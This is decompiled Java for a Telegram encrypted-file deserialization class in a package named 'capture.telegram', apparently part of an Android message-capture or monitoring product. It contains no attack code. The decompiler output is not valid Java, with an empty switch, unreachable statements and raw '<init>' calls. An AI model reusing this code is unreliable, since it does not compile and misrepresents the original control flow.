package com.vvt.capture.telegram.internal;

public class TLRPC$EncryptedFile
  extends TLObject
{
  public long access_hash;
  public int dc_id;
  public long id;
  public int key_fingerprint;
  public int size;
  
  public static EncryptedFile TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in EncryptedFile", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_encryptedFile;
      ((TLRPC.TL_encryptedFile)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_encryptedFileEmpty;
      ((TLRPC.TL_encryptedFileEmpty)localObject).<init>();
    }
    if (localObject != null) {
      ((EncryptedFile)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (EncryptedFile)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$EncryptedFile.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */